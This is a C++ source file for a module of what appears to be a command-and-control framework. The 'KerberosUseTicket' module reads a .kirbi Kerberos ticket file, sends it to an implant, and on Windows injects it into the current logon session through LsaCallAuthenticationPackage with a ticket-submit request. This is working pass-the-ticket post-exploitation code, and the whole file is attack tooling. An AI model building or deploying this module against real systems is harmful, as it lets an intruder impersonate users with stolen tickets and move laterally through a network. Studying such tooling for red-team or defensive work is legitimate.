#include "KerberosUseTicket.hpp"

#include <cstring>

#include "Tools.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <ntsecapi.h>

#pragma comment(lib, "Secur32.lib")
// TODO remove
#include <ntstatus.h>
#pragma comment(lib, "windowsapp.lib")

#endif


using namespace std;

#ifdef __linux__

#elif _WIN32

#define STATUS_SUCCESS            ((NTSTATUS)0x00000000L)
#define STATUS_ACCESS_DENIED      ((NTSTATUS)0xC0000022L)

typedef std::vector<unsigned char> TicketData;

#endif

// TODO set kerberosUseTicket
const std::string moduleName = "kerberosUseTicket";


#ifdef _WIN32

__declspec(dllexport) KerberosUseTicket* KerberosUseTicketConstructor() 
{
    return new KerberosUseTicket();
}

#endif


KerberosUseTicket::KerberosUseTicket()
	: ModuleCmd(moduleName)
{
}

KerberosUseTicket::~KerberosUseTicket()
{
}

std::string KerberosUseTicket::getInfo()
{
	std::string info;
	info += "KerberosUseTicket:\n";
	info += "Import a kerberos ticket from a file to the curent LUID. \n";
	info += "exemple:\n";
	info += "- KerberosUseTicket /tmp/ticket.kirbi\n";

	return info;
}

int KerberosUseTicket::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    if (splitedCmd.size() == 2)
	{
		string inputFile = splitedCmd[1];

		std::ifstream input(inputFile, std::ios::binary);
		if( input ) 
		{
			std::string buffer(std::istreambuf_iterator<char>(input), {});

			c2Message.set_instruction(splitedCmd[0]);
			c2Message.set_inputfile(inputFile);
			c2Message.set_data(buffer.data(), buffer.size());
        }
		else
		{
			c2Message.set_returnvalue("Failed: Couldn't open file.");
			return -1;
		}
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}

	return 0;
}


int KerberosUseTicket::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string cmd = c2Message.cmd();
	const std::string buffer = c2Message.data();

   std::string out = importTicket(buffer);

	c2RetMessage.set_instruction(m_name);
	c2RetMessage.set_cmd(cmd);
	c2RetMessage.set_returnvalue(out);
	return 0;
}


std::string KerberosUseTicket::importTicket(const std::string& ticket)
{
	std::string result;

#ifdef __linux__ 

    result += "KerberosUseTicket don't work in linux.\n";

#elif _WIN32

     // LsaConnectUntrusted
    HANDLE lsaHandle = NULL;
    NTSTATUS ntstatus = LsaConnectUntrusted(&lsaHandle);
    if (ntstatus != 0)
    {
        result += "LsaConnectUntrusted error.\n";
        return result;
    }

    // LsaLookupAuthenticationPackage
    LSA_STRING lsaStrAuthPkg;
    lsaStrAuthPkg.Length = static_cast<USHORT>(strlen(MICROSOFT_KERBEROS_NAME_A));
    lsaStrAuthPkg.MaximumLength = static_cast<USHORT>(strlen(MICROSOFT_KERBEROS_NAME_A));
    lsaStrAuthPkg.Buffer = MICROSOFT_KERBEROS_NAME_A;
    ULONG authenticationPackage;
    ntstatus = LsaLookupAuthenticationPackage(lsaHandle, (PLSA_STRING)&lsaStrAuthPkg, &authenticationPackage);
    if (ntstatus != 0)
    {
        result += "LsaLookupAuthenticationPackage error.\n";
        return result;
    }
   
    // LsaCallAuthenticationPackage with KERB_SUBMIT_TKT_REQUEST
    PVOID profileBuffer = NULL;
    ULONG profileBufferLen;
    NTSTATUS subStatus;

    ULONG submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + ticket.size();
    PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
    if(pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST) LocalAlloc(LPTR, submitSize))
	{
        pKerbSubmit->MessageType = KerbSubmitTicketMessage;
        pKerbSubmit->KerbCredSize = ticket.size();
        pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
        RtlCopyMemory((PBYTE) pKerbSubmit + pKerbSubmit->KerbCredOffset, ticket.data(), pKerbSubmit->KerbCredSize);

        ntstatus = LsaCallAuthenticationPackage(lsaHandle, authenticationPackage, 
        pKerbSubmit, submitSize, 
        &profileBuffer, &profileBufferLen, &subStatus);
    }

    if (ntstatus != 0 || subStatus !=0)
    {
        result += "LsaCallAuthenticationPackage error.\n";
        LocalFree(pKerbSubmit);
        return result;
    }

    LocalFree(pKerbSubmit);

    result += "Ticket successfully imported.\n";

#endif

	return result;
}